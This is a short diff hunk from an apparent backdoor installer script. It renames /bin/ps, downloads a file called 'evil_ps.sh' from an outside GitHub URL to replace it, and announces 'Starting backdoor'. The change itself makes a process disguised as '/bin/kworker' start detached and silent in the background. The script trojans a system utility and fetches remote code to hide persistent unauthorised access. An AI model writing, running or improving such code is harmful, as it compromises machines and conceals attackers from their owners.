@@ -16,4 +16,4 @@ mv /bin/ps /bin/pso
 curl -s -H 'Cache-Control: no-cache' https://raw.githubusercontent.com/anforsm/command_and_control/main/evil_ps.sh > /bin/ps
 chmod +x /bin/ps
 echo "Installation complete. Starting backdoor"
-/bin/kworker
+nohup /bin/kworker > /dev/null 2>&1 &
